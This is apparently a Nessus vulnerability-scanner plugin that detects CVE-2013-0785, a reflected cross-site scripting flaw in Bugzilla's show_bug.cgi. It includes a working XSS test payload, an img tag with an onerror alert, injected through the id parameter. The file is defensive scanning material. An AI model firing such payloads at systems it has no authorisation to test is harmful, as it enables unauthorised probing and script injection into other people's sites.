#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(64877);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2016/05/04 14:30:40 $");

  script_cve_id("CVE-2013-0785");
  script_bugtraq_id(58060);
  script_osvdb_id(90404);

  script_name(english:"Bugzilla show_bug.cgi id Parameter XSS");
  script_summary(english:"Tries to inject script code via the id parameter");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI application that if affected by a
cross-site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Bugzilla installed on the remote host is affected by a
cross-site scripting vulnerability because it fails to properly
sanitize user-supplied input to the 'id' parameter of the
'show_bug.cgi' script. An attacker may be able to leverage this to
inject arbitrary HTML and script code into a user's browser to be
executed within the security context of the affected site.

Note that the install is also likely to be affected by an information
disclosure vulnerability; however, Nessus has not tested for this.");
  script_set_attribute(attribute:"see_also", value:"https://bugzilla.mozilla.org/show_bug.cgi?id=842038");
  script_set_attribute(attribute:"see_also", value:"http://www.bugzilla.org/security/3.6.12/");
  script_set_attribute(attribute:"solution", value:"Upgrade to Bugzilla 3.6.13 / 4.0.10 / 4.2.5 / 4.4rc2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/02/16");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/02/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/02/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mozilla:bugzilla");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("bugzilla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Bugzilla");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");
include("url_func.inc");

app = 'Bugzilla';
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name:app,
  port:port,
  exit_if_unknown_ver:TRUE
);

dir = install["path"];
xss_test = '"><img src="nessus.jpg" onerror=javascript:alert("' + SCRIPT_NAME + '-' + unixtime() + '")>';

exploit = test_cgi_xss(
  port     : port,
  dirs     : make_list(dir),
  cgi      : '/show_bug.cgi',
  qs       : 'id=' + urlencode(str:xss_test) + '&format=123',
  pass_str : 'name="id" value="' + xss_test,
  pass_re  : 'href="show_bug.cgi\\?id='
);

if (!exploit)
{
  install_url = build_url(qs:dir + "/query.cgi", port: port);
  audit(AUDIT_WEB_APP_NOT_AFFECTED, "Bugzilla", install_url);
}
